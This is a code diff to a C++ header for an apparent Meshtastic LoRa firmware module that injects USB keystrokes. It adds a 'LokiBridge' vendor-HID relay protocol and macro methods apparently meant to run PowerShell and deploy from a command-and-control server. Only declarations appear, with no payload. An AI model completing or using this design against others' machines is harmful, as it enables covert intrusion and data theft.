@@ -4,10 +4,24 @@
 #include "mesh/generated/meshtastic/mesh.pb.h"
 #include "USB.h"
 #include "USBHIDKeyboard.h"
+#include "USBHIDVendor.h"
 #include "class/hid/hid.h"  // For HID_KEY_ constants
 
-// Global USB HID Keyboard object (like in working standalone project)
+// Global USB HID objects
 extern USBHIDKeyboard Keyboard;
+extern USBHIDVendor   VendorHID;
+
+// LokiBridge wire protocol constants
+static constexpr uint8_t LB_CTRL_SHORT          = 0xFF;
+static constexpr uint8_t LB_CTRL_RESET          = 0xFE;
+static constexpr uint8_t LB_CTRL_START          = 0x00;
+static constexpr uint8_t LB_CTRL_CONTINUE       = 0x01;
+static constexpr uint8_t LB_CTRL_CHUNK_BOUNDARY = 0x02;
+static constexpr uint8_t LB_CTRL_END            = 0x03;
+
+static constexpr size_t  LB_REPORT_SIZE     = 63;
+static constexpr size_t  LB_DATA_PER_REPORT = 62;
+static constexpr size_t  LB_CHUNK_MAX       = LB_DATA_PER_REPORT * 3; // 186 bytes
 
 class HIDKeyboardModule : public MeshModule
 {
@@ -17,6 +31,9 @@ class HIDKeyboardModule : public MeshModule
 
     bool wantPacket(const meshtastic_MeshPacket *p) override;
     bool init();
+
+    // Called from main loop to poll for LokiBridge responses
+    void lokiBridgeLoop();
 
   protected:
     virtual ProcessMessage handleReceived(const meshtastic_MeshPacket &mp) override;
@@ -37,8 +54,35 @@ class HIDKeyboardModule : public MeshModule
     void pressLeft();
     void pressRight();
 
+    // Macro commands
+    void executePSH();
+    void executeDeploy(const String &c2Server);
+
+    // LokiBridge methods
+    void sendLokiBridgeCmd(const char *cmdStr);
+    void sendLokiBridgeReset();
+    void processLokiBridgeReport(const uint8_t *buf);
+    void flushChunk(bool isFinal);
+    void sendLoRaResponse(const char *text);
+    String getLokiBridgeStatus();
+    void handleSerialLokiBridge();
+
     bool hidInitialized = false;
     bool hidReady = false;
+
+    // LokiBridge state
+    static constexpr size_t CHUNK_BUF_SIZE = LB_CHUNK_MAX + 1;
+    uint8_t chunkBuf[CHUNK_BUF_SIZE] = {};
+    size_t  chunkLen = 0;
+    bool    messageInProgress = false;
+    int     chunkCount = 0;
+    bool    awaitingResponse = false;
+    NodeNum lokiBridgeSender = 0; // node to send responses back to
+
+    // Serial command buffer for LBSTATUS/LBRESET
+    static constexpr size_t CMD_BUF_SIZE = 64;
+    char cmdBuf[CMD_BUF_SIZE] = {};
+    size_t cmdBufPos = 0;
 };
 
 extern HIDKeyboardModule *hidKeyboardModule;
